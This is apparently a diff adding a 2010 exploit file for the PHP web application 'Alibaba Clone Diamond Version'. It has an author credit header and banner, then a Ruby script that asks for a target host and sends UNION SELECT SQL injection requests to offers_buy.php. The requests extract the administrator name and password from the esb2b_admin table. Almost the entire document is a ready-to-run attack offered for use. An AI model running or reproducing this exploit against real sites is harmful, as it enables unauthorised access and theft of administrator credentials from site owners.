@@ -1,0 +1,63 @@
+----------------------------Information------------------------------------------------
++Name : Alibaba Clone Diamond Version SQL Injection Vulnerability Exploit
++Autor : Easy Laster
++ICQ : 11-051-551
++Date   : 09.05.2010
++Script  : Alibaba Clone Diamond Version
++Price : $699
++Language :PHP
++Discovered by Easy Laster 4004-security-project.com
++Security Group Undergroundagents and 4004-Security-Project 4004-security-project.com
++And all Friends of Cyberlive : R!p,Eddy14,Silent Vapor,Nolok,
+Kiba,-tmh-,Dr.ChAoS,HANN!BAL,Kabel,-=Player=-,Lidloses_Auge,
+N00bor,Ic3Drag0n,novaca!ne,n3w7u,Maverick010101,s0red,c1ox.
+  
+---------------------------------------------------------------------------------------
+                                                                                       
+ ___ ___ ___ ___                         _ _           _____           _         _ 
+| | |   |   | | |___ ___ ___ ___ _ _ ___|_| |_ _ _ ___|  _  |___ ___  |_|___ ___| |_
+|_  | | | | |_  |___|_ -| -_|  _| | |  _| |  _| | |___|   __|  _| . | | | -_|  _|  _|
+  |_|___|___| |_|   |___|___|___|___|_| |_|_| |_  |   |__|  |_| |___|_| |___|___|_|
+                                              |___|                 |___|          
+  
+  
+----------------------------------------------------------------------------------------
++Vulnerability : www.site.com/cms/offers_buy.php?id=
+----------------------------------------------------------------------------------------
+#!/usr/bin/ruby
+#4004-security-project.com
+#Discovered and vulnerability by Easy Laster
+require 'net/http'
+print "
+#########################################################
+#               4004-Security-Project.com               #
+#########################################################
+#        Alibaba Clone Diamond Version SQL Injection    #
+#                  Vulnerability Exploit                #
+#                      Using Host+Path                  #
+#                       demo.com /cms/                  #
+#                         Easy Laster                   #
+#########################################################
+"
+block = "#########################################################"
+print ""+ block +""
+print "\nEnter host name (site.com)->"
+host=gets.chomp
+print ""+ block +""
+print "\nEnter script path (/cms/ or /)->"
+path=gets.chomp
+print ""+ block +""
+begin
+dir = "offers_buy.php?id=9999+union+select+0,0,concat(0x23,0x23,0x23,0x23,0x23,es_admin_name,0x23,0x23,0x23,0x23,0x23),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0+from+esb2b_admin--"
+http = Net::HTTP.new(host, 80)
+resp= http.get(path+dir)
+print "\nThe Admin Name is  -> "+(/#####(.+)#####/).match(resp.body)[1]
+dir = "offers_buy.php?id=9999+union+select+0,0,concat(0x23,0x23,0x23,0x23,0x23,es_pwd,0x23,0x23,0x23,0x23,0x23),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0+from+esb2b_admin--"
+http = Net::HTTP.new(host, 80)
+resp= http.get(path+dir)
+print "\nThe Password is  -> "+(/#####(.+)#####/).match(resp.body)[1]
+print "\n"+ block +""
+rescue
+print "\nExploit failed"
+end
+
